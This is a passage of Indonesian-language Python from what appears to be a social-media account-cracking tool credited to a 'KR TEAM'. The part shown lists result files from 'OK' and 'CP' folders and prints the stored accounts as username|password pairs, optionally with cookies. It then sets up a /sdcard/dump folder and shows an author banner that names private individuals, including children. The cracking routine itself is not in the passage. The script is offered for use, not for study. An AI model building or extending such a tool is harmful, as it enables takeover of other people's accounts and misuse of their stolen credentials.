			exit("\nfile %s tidak tersedia"%(kontol))
		print(f'\n[{h}1{p}] Tampilkan Cookie Saat Memeriksa Hasil')
		print(f'[{h}2{p}] Jangan Tampilkan Cookie Saat Memeriksa Hasil')
		ask = input(f'\n[{h}!{p}] pilihan 1 sampai 2 : ')
		nm_file = ("%s"%(kontol)).replace("-", " ")
		del_txt = nm_file.replace(".txt", "")
		print(f'\nTanggal Hasil File : {del_txt} - Total Akun : {len(totalok)}\n')
		if ask in["1"]:
			for z in totalok:
				print(f"{h}{z}")
		else:
			for z in totalok:
				data = z.replace(" * --> ","")
				user,pw = data.split("|")[0],data.split("|")[1]
				print(f"{h}{user}|{pw}")
		print(f'\n{p}Sukses Memeriksa File Dan Menemukan {len(totalok)} Akun Di File')
		time.sleep(4);menu()
	elif res in["2","02"]:
		dirsi = os.listdir("CP")
		print(f'\nSudah Ditemukan {len(dirsi)} File Hasil CP')
		num = 0
		for file in dirsi:
			num += 1
			files.append(file)
			totalcp = open(f"CP/{file}","r").read().splitlines()
			print(f'\n0{num} {file} {len(totalcp)} Akun ')
		bngst = input(f"\nPilihan 1 Sampai {num} : ")
		try:
			kontol = files[int(bngst)-1]
			totalcp = open("CP/%s"%(kontol)).read().splitlines()
		except IOError:
			exit("\nfile %s tidak tersedia"%(kontol))
		print(f'\n[{h}1{p}] Tampilkan hasik CP')
		print(f'[{h}2{p}] Jangan Tampilkan CP')
		ask = input(f'\n[{h}!{p}] pilihan 1 sampai 2 : ')
		nm_file = ("%s"%(kontol)).replace("-", " ")
		del_txt = nm_file.replace(".txt", "")
		print(f'\nTanggal Hasil File : {del_txt} - Total Akun : {len(totalcp)}\n')
		if ask in["1"]:
			for z in totalcp:
				print(f"{k}{z}")
		else:
			for z in totalcp:
				data = z.replace(" * --> ","")
				user,pw = data.split("|")[0],data.split("|")[1]
				print(f"{k}{user}|{pw}")
		print(f'\n{p}Sukses Memeriksa File Dan Menemukan {len(totalcp)} Akun Di File')
		time.sleep(3);menu()
		


if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/dump')
	except:pass
	os.system('clear')
	banner3()
	KR_TEAM(f'{h}Script ini dibuat oleh salah satu anggota Keyboard Warrior:\n{k}##### Hendrian Setyawan ###### \n{h}Di Support oleh All anggota KR TEAM: \n{p}Muhammad Agam Nugraha Pranata\nMuhammad Nizam Azmi\nBayu Putra Pratama\nAbdul Rohman Sholeh\n{h}Hargai Author pembuat Script ini dengan tanpa mengubah nama info diatas\n{M}Hendrian Sudah Menikah dengan gadis desa yang gemoy bernama Alvita Widya Wulandari\nHendrian telah mempunyai anak 6 diantaranya santika putri wulandari,aditya rahman algozi ,adham setyawan,marwah alqoyyum,sindy rahmah setyawati,dan qohhar alqoff  ')
	time.sleep(5)
	cekdata()
